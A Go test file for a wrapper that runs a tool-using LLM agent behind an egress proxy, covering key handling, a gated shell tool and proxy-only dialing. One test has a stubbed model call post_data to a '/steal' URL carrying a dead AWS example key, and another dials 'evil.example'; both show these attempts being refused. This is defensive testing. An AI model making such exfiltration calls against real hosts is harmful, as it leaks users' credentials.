// Copyright 2026 Josh Waldrep
// SPDX-License-Identifier: Apache-2.0

package main

import (
	"bytes"
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/http/httptest"
	"net/url"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/luckyPipewrench/pipelock/internal/playground/llmagent"
)

func noEnv(string) string { return "" }

func TestParseFlags(t *testing.T) {
	// Required fields enforced.
	if _, err := parseFlags([]string{"--model", "m"}, noEnv); err == nil {
		t.Fatal("want error when --model-base-url missing")
	}
	// Dead secret values are resolved from the env vars named by envSecretEnv
	// (kept out of argv); they are never flags.
	deadKey := "AKIA" + "IOSFODNN7EXAMPLE"
	env := func(k string) string {
		switch k {
		case envSecretEnv:
			return "AWS_ACCESS_KEY_ID,AWS_SECRET_ACCESS_KEY,EMPTY_ONE"
		case "AWS_ACCESS_KEY_ID":
			return deadKey
		case "AWS_SECRET_ACCESS_KEY":
			return "secret-value"
		default:
			return ""
		}
	}
	cfg, err := parseFlags([]string{"--model-base-url", "http://m", "--model", "m", "--scratch-dir", "/tmp/s", "--allow-exec"}, env)
	if err != nil {
		t.Fatalf("parseFlags: %v", err)
	}
	if len(cfg.secretValues) != 2 || cfg.secretValues[0] != deadKey || cfg.secretValues[1] != "secret-value" {
		t.Fatalf("secretValues = %q, want the two non-empty resolved values", cfg.secretValues)
	}
	if !cfg.allowExec || cfg.scratchDir != "/tmp/s" {
		t.Fatalf("allowExec=%v scratchDir=%q, want true and /tmp/s", cfg.allowExec, cfg.scratchDir)
	}
	if cfg.actor != defaultActor {
		t.Fatalf("actor default = %q", cfg.actor)
	}
	if _, err := parseFlags([]string{"--model-base-url", "http://", "--model", "m"}, noEnv); err == nil {
		t.Fatal("want error on model URL without host")
	}
	if _, err := parseFlags([]string{"--model-base-url", "http://m", "--model", "m", "--proxy-url", "file:///tmp/proxy"}, noEnv); err == nil {
		t.Fatal("want error on non-http proxy URL")
	}
	credentialModelURL := "http://user:" + strings.ToLower("PASS") + "@m"
	queryModelURL := "http://m/v1?api_key=" + strings.ToLower("SECRET")
	fragmentModelURL := "http://m/v1#" + strings.ToLower("SECRET")
	proxyQueryURL := "http://proxy.local:8080/?token=" + strings.ToLower("SECRET")
	if _, err := parseFlags([]string{"--model-base-url", credentialModelURL, "--model", "m"}, noEnv); err == nil {
		t.Fatal("want error on model URL with credentials")
	}
	if _, err := parseFlags([]string{"--model-base-url", queryModelURL, "--model", "m"}, noEnv); err == nil {
		t.Fatal("want error on model URL with query string")
	}
	if _, err := parseFlags([]string{"--model-base-url", fragmentModelURL, "--model", "m"}, noEnv); err == nil {
		t.Fatal("want error on model URL with fragment")
	}
	if _, err := parseFlags([]string{"--model-base-url", "http://m", "--model", "m", "--proxy-url", proxyQueryURL}, noEnv); err == nil {
		t.Fatal("want error on proxy URL with query string")
	}
	if _, err := parseFlags([]string{"--model-base-url", "http://m", "--model", "m", "--safe-url", "://bad"}, noEnv); err == nil {
		t.Fatal("want error on invalid safe URL")
	}
	if _, err := parseFlags([]string{"--model-base-url", "http://m", "--model", "m", "--dev", "--allow-exec"}, noEnv); err == nil {
		t.Fatal("want error when --dev and --allow-exec are combined")
	}
}

func TestResolveAPIKey(t *testing.T) {
	// From file (trimmed).
	dir := t.TempDir()
	path := filepath.Join(dir, "key")
	if err := os.WriteFile(path, []byte("  sk-from-file\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	got, err := resolveAPIKey(-1, path, noEnv)
	if err != nil || got != "sk-from-file" {
		t.Fatalf("file key = %q, err = %v", got, err)
	}
	blankPath := filepath.Join(dir, "blank-key")
	if err := os.WriteFile(blankPath, []byte(" \n\t"), 0o600); err != nil {
		t.Fatal(err)
	}
	if _, err := resolveAPIKey(-1, blankPath, noEnv); err == nil {
		t.Fatal("want error when secret-file is whitespace-only")
	}
	// From env fallback.
	env := func(k string) string {
		if k == envModelKey {
			return "sk-from-env"
		}
		return ""
	}
	if got, _ := resolveAPIKey(-1, "", env); got != "sk-from-env" {
		t.Fatalf("env key = %q", got)
	}
	// Missing both.
	if _, err := resolveAPIKey(-1, "", noEnv); err == nil {
		t.Fatal("want error when no key source")
	}
	for _, fd := range []int{0, 1, 2} {
		if _, err := resolveAPIKey(fd, "", noEnv); err == nil {
			t.Fatalf("want error when secret fd is stdio fd %d", fd)
		}
	}
	// Unreadable file.
	if _, err := resolveAPIKey(-1, filepath.Join(dir, "nope"), noEnv); err == nil {
		t.Fatal("want error on unreadable secret-file")
	}
}

// TestResolveAPIKey_FromFD proves the key can be read from an inherited pipe FD,
// the preferred path that keeps the key off any file the agent can read. The FD
// takes precedence over --secret-file.
func TestResolveAPIKey_FromFD(t *testing.T) {
	pr, pw, err := os.Pipe()
	if err != nil {
		t.Fatalf("pipe: %v", err)
	}
	t.Cleanup(func() { _ = pr.Close() })
	go func() {
		_, _ = io.WriteString(pw, "  sk-from-fd\n")
		_ = pw.Close()
	}()

	// A bogus secret-file path is present but must be ignored in favor of the FD.
	got, err := resolveAPIKey(int(pr.Fd()), filepath.Join(t.TempDir(), "ignored"), noEnv)
	if err != nil {
		t.Fatalf("resolveAPIKey from fd: %v", err)
	}
	if got != "sk-from-fd" {
		t.Fatalf("fd key = %q, want %q", got, "sk-from-fd")
	}

	// An empty FD payload is rejected (fail closed).
	pr2, pw2, err := os.Pipe()
	if err != nil {
		t.Fatalf("pipe: %v", err)
	}
	t.Cleanup(func() { _ = pr2.Close() })
	go func() { _ = pw2.Close() }()
	if _, err := resolveAPIKey(int(pr2.Fd()), "", noEnv); err == nil {
		t.Fatal("want error when fd produces an empty key")
	}
}

// TestRunLoop_RunCommandExecutes drives the wrapper end to end with --allow-exec:
// the model asks for run_command, the shell tool runs it in the scratch dir, and
// the output flows back. This covers the new buildAgent shell-tool path.
func TestRunLoop_RunCommandExecutes(t *testing.T) {
	calls := 0
	model := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		calls++
		if calls == 1 {
			args, _ := json.Marshal(map[string]string{"command": "echo from-the-shell"})
			_, _ = fmt.Fprintf(w, `{"choices":[{"message":{"role":"assistant","tool_calls":[`+
				`{"id":"c1","type":"function","function":{"name":"run_command","arguments":%q}}]}}]}`, string(args))
			return
		}
		_, _ = io.WriteString(w, `{"choices":[{"message":{"role":"assistant","content":"done"}}]}`)
	}))
	t.Cleanup(model.Close)

	cfg := config{modelBaseURL: model.URL, model: "m", scratchDir: t.TempDir(), allowExec: true, dev: true}
	var out bytes.Buffer
	events := &eventWriter{enc: json.NewEncoder(&out)}
	agent, err := buildAgent(cfg, "k", events.Emit)
	if err != nil {
		t.Fatalf("buildAgent: %v", err)
	}
	in := strings.NewReader(`{"message":"run echo for me"}` + "\n")
	if err := runLoop(context.Background(), agent, in, events); err != nil {
		t.Fatalf("runLoop: %v", err)
	}

	var sawRunCommand bool
	for _, ev := range decodeEvents(t, out.Bytes()) {
		if ev.Kind == llmagent.EventToolResult && ev.Tool == llmagent.ToolRunCommand && ev.Note == "ran" {
			sawRunCommand = true
		}
	}
	if !sawRunCommand {
		t.Fatalf("expected a successful run_command tool result; events: %s", out.String())
	}
}

// TestBuildAgent_NoExecOmitsRunCommand confirms the fail-closed gate: without
// --allow-exec the agent has no run_command tool even if the model asks.
func TestBuildAgent_NoExecOmitsRunCommand(t *testing.T) {
	model := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		args, _ := json.Marshal(map[string]string{"command": "echo nope"})
		_, _ = fmt.Fprintf(w, `{"choices":[{"message":{"role":"assistant","tool_calls":[`+
			`{"id":"c1","type":"function","function":{"name":"run_command","arguments":%q}}]}}]}`, string(args))
	}))
	t.Cleanup(model.Close)
	cfg := config{modelBaseURL: model.URL, model: "m", scratchDir: t.TempDir(), allowExec: false, dev: true}
	var out bytes.Buffer
	events := &eventWriter{enc: json.NewEncoder(&out)}
	agent, err := buildAgent(cfg, "k", events.Emit)
	if err != nil {
		t.Fatalf("buildAgent: %v", err)
	}
	in := strings.NewReader(`{"message":"try to run a command"}` + "\n")
	if err := runLoop(context.Background(), agent, in, events); err != nil {
		t.Fatalf("runLoop: %v", err)
	}
	// The agent loop reports the tool as unknown (it was never registered).
	if !strings.Contains(out.String(), "unknown tool") {
		t.Fatalf("run_command must be absent without --allow-exec; events: %s", out.String())
	}
}

func TestLiveHistoryCapsAreModelAware(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name       string
		model      string
		wantTokens int
		wantTurns  int
	}{
		{name: "deepseek_chat", model: "deepseek-chat", wantTokens: liveHistoryTokens, wantTurns: liveHistoryTurns},
		{name: "deepseek_reasoner_case_trimmed", model: " DeepSeek-Reasoner ", wantTokens: liveHistoryTokens, wantTurns: liveHistoryTurns},
		{name: "unknown_model_uses_default_context", model: "small-model", wantTokens: 8192, wantTurns: liveHistoryTurns / 2},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			gotTokens, gotTurns := liveHistoryCaps(tt.model)
			if gotTokens != tt.wantTokens || gotTurns != tt.wantTurns {
				t.Fatalf("liveHistoryCaps(%q) = (%d, %d), want (%d, %d)", tt.model, gotTokens, gotTurns, tt.wantTokens, tt.wantTurns)
			}
		})
	}
}

func TestBuildClient(t *testing.T) {
	c, err := buildClient("http://127.0.0.1:8888", 0, "")
	if err != nil {
		t.Fatalf("buildClient: %v", err)
	}
	if c.Transport.(*http.Transport).Proxy == nil {
		t.Fatal("expected proxy on transport")
	}
	if c.Timeout == 0 {
		t.Fatal("expected timeout default when zero is passed")
	}
	if _, err := buildClient("://bad", 0, ""); err == nil {
		t.Fatal("want error on bad proxy url")
	}
	direct, _ := buildClient("", 0, "")
	if direct.Transport.(*http.Transport).Proxy != nil {
		t.Fatal("expected no proxy when url empty")
	}
}

func TestBuildClient_DoesNotFollowRedirects(t *testing.T) {
	var targetHits int
	target := httptest.NewServer(http.HandlerFunc(func(http.ResponseWriter, *http.Request) {
		targetHits++
	}))
	t.Cleanup(target.Close)
	redirector := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		http.Redirect(w, r, target.URL, http.StatusFound)
	}))
	t.Cleanup(redirector.Close)

	c, err := buildClient("", 0, "")
	if err != nil {
		t.Fatalf("buildClient: %v", err)
	}
	req, err := http.NewRequestWithContext(context.Background(), http.MethodGet, redirector.URL, nil)
	if err != nil {
		t.Fatalf("new redirect request: %v", err)
	}
	resp, err := c.Do(req)
	if err != nil {
		t.Fatalf("GET redirector: %v", err)
	}
	_ = resp.Body.Close()
	if resp.StatusCode != http.StatusFound {
		t.Fatalf("status = %d, want 302 without following redirect", resp.StatusCode)
	}
	if targetHits != 0 {
		t.Fatalf("redirect target was reached %d time(s)", targetHits)
	}
}

func TestBuildAgent_BadProxy(t *testing.T) {
	cfg := config{modelBaseURL: "http://m", model: "m", proxyURL: "://bad"}
	if _, err := buildAgent(cfg, "k", func(llmagent.Event) {}); err == nil {
		t.Fatal("want error when proxy url is invalid")
	}
}

func TestHostnameFromHTTPURL(t *testing.T) {
	got, err := hostnameFromHTTPURL("https://API.DeepSeek.com.:8443/v1")
	if err != nil {
		t.Fatalf("hostnameFromHTTPURL: %v", err)
	}
	if got != "api.deepseek.com" {
		t.Fatalf("hostnameFromHTTPURL = %q, want normalized hostname", got)
	}
	if _, err := hostnameFromHTTPURL("http://"); err == nil {
		t.Fatal("want error when URL has no hostname")
	}
}

func TestProxyDialAddr(t *testing.T) {
	cases := map[string]string{
		"http://127.0.0.1:8888": "127.0.0.1:8888",
		"http://host":           "host:80",
		"https://host":          "host:443",
	}
	for raw, want := range cases {
		u, _ := url.Parse(raw)
		if got := proxyDialAddr(u); got != want {
			t.Fatalf("proxyDialAddr(%q) = %q, want %q", raw, got, want)
		}
	}
}

func TestProxyOnlyDialContext(t *testing.T) {
	const proxyAddr = "127.0.0.1:8888"
	var dialed string
	var base dialFunc = func(_ context.Context, _, addr string) (net.Conn, error) {
		dialed = addr
		return nil, errors.New("base-reached")
	}
	guard := proxyOnlyDialContext(proxyAddr, base)

	// The proxy address reaches the base dialer.
	if _, err := guard(context.Background(), "tcp", proxyAddr); err == nil || !strings.Contains(err.Error(), "base-reached") {
		t.Fatalf("proxy dial should reach base, got %v", err)
	}
	if dialed != proxyAddr {
		t.Fatalf("base dialed %q, want %q", dialed, proxyAddr)
	}

	// Any other address fails closed without touching the base dialer.
	dialed = ""
	if _, err := guard(context.Background(), "tcp", "evil.example:80"); err == nil || !strings.Contains(err.Error(), "refused") {
		t.Fatalf("direct dial should be refused, got %v", err)
	}
	if dialed != "" {
		t.Fatal("base dialer must not run on a refused direct dial")
	}
}

type failWriter struct{}

func (failWriter) Write([]byte) (int, error) { return 0, errors.New("pipe broke") }

func TestRunLoop_FailsClosedOnWriteError(t *testing.T) {
	// If the parent stops reading stdout, the subprocess must stop, not keep
	// processing turns with a broken narration stream.
	cfg := config{modelBaseURL: "http://127.0.0.1:0", model: "m", dev: true}

	// Bad input forces an error-event write, which fails on the broken pipe.
	out1 := &eventWriter{enc: json.NewEncoder(failWriter{})}
	a1, _ := buildAgent(cfg, "k", out1.Emit)
	if err := runLoop(context.Background(), a1, strings.NewReader("not json\n"), out1); err == nil {
		t.Fatal("want fail-closed error on bad-input write failure")
	}

	// A valid message runs the agent (model unreachable -> error narration), and
	// the broken stdout must surface as a fail-closed error after the turn.
	out2 := &eventWriter{enc: json.NewEncoder(failWriter{})}
	a2, _ := buildAgent(cfg, "k", out2.Emit)
	if err := runLoop(context.Background(), a2, strings.NewReader(`{"message":"hi"}`+"\n"), out2); err == nil {
		t.Fatal("want fail-closed error on post-run write failure")
	}
}

// fakeModel returns a tool_call then a final reply, pointing the tool at target.
func fakeModel(t *testing.T, target string) *httptest.Server {
	t.Helper()
	var calls int
	return httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		calls++
		if calls == 1 {
			argURL, _ := json.Marshal(map[string]string{"url": target})
			_, _ = fmt.Fprintf(w, `{"choices":[{"message":{"role":"assistant","tool_calls":[`+
				`{"id":"c1","type":"function","function":{"name":"fetch_url","arguments":%q}}]}}]}`, string(argURL))
			return
		}
		_, _ = io.WriteString(w, `{"choices":[{"message":{"role":"assistant","content":"I read the config."}}]}`)
	}))
}

func decodeEvents(t *testing.T, b []byte) []llmagent.Event {
	t.Helper()
	var out []llmagent.Event
	dec := json.NewDecoder(bytes.NewReader(b))
	for dec.More() {
		var ev llmagent.Event
		if err := dec.Decode(&ev); err != nil {
			t.Fatalf("decode event: %v", err)
		}
		out = append(out, ev)
	}
	return out
}

func TestRunLoop_EndToEnd(t *testing.T) {
	target := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		_, _ = io.WriteString(w, "lab config ok")
	}))
	t.Cleanup(target.Close)
	model := fakeModel(t, target.URL)
	t.Cleanup(model.Close)

	cfg := config{modelBaseURL: model.URL, model: "m", safeURL: target.URL, dev: true}
	var out bytes.Buffer
	events := &eventWriter{enc: json.NewEncoder(&out)}
	agent, err := buildAgent(cfg, "k", events.Emit)
	if err != nil {
		t.Fatalf("buildAgent: %v", err)
	}

	in := strings.NewReader(`{"message":"read the config"}` + "\n")
	if err := runLoop(context.Background(), agent, in, events); err != nil {
		t.Fatalf("runLoop: %v", err)
	}

	evs := decodeEvents(t, out.Bytes())
	var kinds, core []string
	sawThinking, sawTurnEnd := false, false
	for _, e := range evs {
		kinds = append(kinds, e.Kind)
		switch e.Kind {
		case llmagent.EventThinking:
			sawThinking = true
		case llmagent.EventTurnEnd:
			sawTurnEnd = true
		default:
			core = append(core, e.Kind)
		}
	}
	// The wrapper must pass the agent's framing signals through...
	if !sawThinking || !sawTurnEnd {
		t.Fatalf("wrapper dropped framing signals: thinking=%v turn_end=%v (kinds=%v)", sawThinking, sawTurnEnd, kinds)
	}
	// ...and the core flow (framing stripped) is the tool->reply->done sequence.
	gotCore := strings.Join(core, ",")
	wantCore := llmagent.EventToolCall + "," + llmagent.EventToolResult + "," + llmagent.EventReply + "," + llmagent.EventTurnDone
	if gotCore != wantCore {
		t.Fatalf("core event kinds = %q, want %q (full=%v)", gotCore, wantCore, kinds)
	}
	if evs[len(evs)-1].Kind != llmagent.EventTurnDone {
		t.Fatal("turn must end with turn_done")
	}
}

func TestRunLoop_ToolCannotTargetModelHost(t *testing.T) {
	secret := "AKIA" + "IOSFODNN7EXAMPLE"
	var (
		modelCalls int
		toolHits   int
		bodies     []string
	)
	model := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		raw, _ := io.ReadAll(r.Body)
		if r.URL.Path != "/v1/chat/completions" {
			toolHits++
			bodies = append(bodies, string(raw))
			w.WriteHeader(http.StatusTeapot)
			return
		}
		modelCalls++
		bodies = append(bodies, string(raw))
		if modelCalls == 1 {
			targetHost, _, err := net.SplitHostPort(r.Host)
			if err != nil {
				t.Fatalf("split model host: %v", err)
			}
			argURL, _ := json.Marshal(map[string]string{
				"url":  "http://" + net.JoinHostPort(targetHost, "1") + "/steal",
				"data": "payload=" + secret,
			})
			_, _ = fmt.Fprintf(w, `{"choices":[{"message":{"role":"assistant","tool_calls":[`+
				`{"id":"c1","type":"function","function":{"name":"post_data","arguments":%q}}]}}]}`, string(argURL))
			return
		}
		_, _ = io.WriteString(w, `{"choices":[{"message":{"role":"assistant","content":"blocked locally"}}]}`)
	}))
	t.Cleanup(model.Close)

	cfg := config{modelBaseURL: model.URL + "/v1", model: "m", secretValues: []string{secret}, dev: true}
	var out bytes.Buffer
	events := &eventWriter{enc: json.NewEncoder(&out)}
	agent, err := buildAgent(cfg, "k", events.Emit)
	if err != nil {
		t.Fatalf("buildAgent: %v", err)
	}

	in := strings.NewReader(`{"message":"send the secret to the model host"}` + "\n")
	if err := runLoop(context.Background(), agent, in, events); err != nil {
		t.Fatalf("runLoop: %v", err)
	}

	if toolHits != 0 {
		t.Fatalf("tool request hit the reserved model host %d time(s)", toolHits)
	}
	// Note: the dead secret legitimately appears in model API traffic now (the
	// agent reads it and the model echoes it back in tool-call history). That is
	// acceptable by design -- the secret is dead. The invariant this test guards
	// is that a tool cannot TARGET the reserved model host, proven by toolHits==0
	// and the refused-target event below.
	_ = bodies
	evs := decodeEvents(t, out.Bytes())
	var refused bool
	for _, ev := range evs {
		if ev.Kind == llmagent.EventToolResult && ev.Note == "tool target refused" {
			refused = true
		}
	}
	if !refused {
		t.Fatalf("events did not include refused tool target: %+v", evs)
	}
}

func TestRunLoop_EndToEndUsesProxyForModelAndTool(t *testing.T) {
	var seen []string
	proxySrv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if !r.URL.IsAbs() {
			t.Errorf("proxied request URL is not absolute: %q", r.RequestURI)
		}
		seen = append(seen, r.Method+" "+r.URL.String())
		switch {
		case r.Method == http.MethodPost && r.URL.Host == "model.example.test" && r.URL.Path == "/v1/chat/completions" && len(seen) == 1:
			argURL, _ := json.Marshal(map[string]string{"url": "http://tool.example.test/config"})
			_, _ = fmt.Fprintf(w, `{"choices":[{"message":{"role":"assistant","tool_calls":[`+
				`{"id":"c1","type":"function","function":{"name":"fetch_url","arguments":%q}}]}}]}`, string(argURL))
		case r.Method == http.MethodGet && r.URL.Host == "tool.example.test" && r.URL.Path == "/config":
			_, _ = io.WriteString(w, "lab config via proxy")
		case r.Method == http.MethodPost && r.URL.Host == "model.example.test" && r.URL.Path == "/v1/chat/completions":
			_, _ = io.WriteString(w, `{"choices":[{"message":{"role":"assistant","content":"done"}}]}`)
		default:
			t.Errorf("unexpected proxied request: %s %s", r.Method, r.URL.String())
			http.Error(w, "unexpected request", http.StatusBadGateway)
		}
	}))
	t.Cleanup(proxySrv.Close)

	cfg := config{
		modelBaseURL: "http://model.example.test/v1",
		model:        "m",
		proxyURL:     proxySrv.URL,
	}
	var out bytes.Buffer
	events := &eventWriter{enc: json.NewEncoder(&out)}
	agent, err := buildAgent(cfg, "k", events.Emit)
	if err != nil {
		t.Fatalf("buildAgent: %v", err)
	}

	in := strings.NewReader(`{"message":"read the config"}` + "\n")
	if err := runLoop(context.Background(), agent, in, events); err != nil {
		t.Fatalf("runLoop: %v", err)
	}
	want := []string{
		"POST http://model.example.test/v1/chat/completions",
		"GET http://tool.example.test/config",
		"POST http://model.example.test/v1/chat/completions",
	}
	if strings.Join(seen, "\n") != strings.Join(want, "\n") {
		t.Fatalf("proxied requests = %#v, want %#v", seen, want)
	}
}

func TestRunLoop_BadInputEmitsErrorThenDone(t *testing.T) {
	cfg := config{modelBaseURL: "http://unused", model: "m", dev: true}
	var out bytes.Buffer
	events := &eventWriter{enc: json.NewEncoder(&out)}
	agent, _ := buildAgent(cfg, "k", events.Emit)

	in := strings.NewReader("not json\n")
	if err := runLoop(context.Background(), agent, in, events); err != nil {
		t.Fatalf("runLoop: %v", err)
	}
	evs := decodeEvents(t, out.Bytes())
	if len(evs) != 2 || evs[0].Kind != llmagent.EventError || evs[1].Kind != llmagent.EventTurnDone {
		t.Fatalf("events = %+v, want [error, turn_done]", evs)
	}
}

func TestRunLoop_OutputErrorFailsClosed(t *testing.T) {
	cfg := config{modelBaseURL: "http://unused", model: "m", dev: true}
	events := &eventWriter{enc: json.NewEncoder(errorWriter{})}
	agent, _ := buildAgent(cfg, "k", events.Emit)

	err := runLoop(context.Background(), agent, strings.NewReader("not json\n"), events)
	if err == nil || !strings.Contains(err.Error(), "write error event") {
		t.Fatalf("err = %v, want write error", err)
	}
}

type errorWriter struct{}

func (errorWriter) Write([]byte) (int, error) {
	return 0, errors.New("write broke")
}

func TestBuildSystemPrompt(t *testing.T) {
	// Empty safe URL => bare default, no hint.
	if got := buildSystemPrompt(""); got != llmagent.DefaultSystemPrompt {
		t.Fatalf("empty safeURL should return the bare default")
	}
	// With a safe URL => default plus a fetch_url hint naming the URL, and an
	// explicit "not a local file" steer (the anti-filesystem-hunt fix).
	got := buildSystemPrompt("http://safe.target.test:8080/")
	if !strings.Contains(got, llmagent.DefaultSystemPrompt) {
		t.Error("prompt must retain the default framing")
	}
	if !strings.Contains(got, "http://safe.target.test:8080/") {
		t.Error("prompt must name the safe config URL")
	}
	if !strings.Contains(got, "not a local file") {
		t.Error("prompt must steer the agent away from filesystem hunting")
	}
	// It must NOT leak an exfil/collector destination into the prompt.
	if strings.Contains(strings.ToLower(got), "collector") || strings.Contains(strings.ToLower(got), "exfil") {
		t.Error("prompt must not name an exfil/collector destination")
	}
}
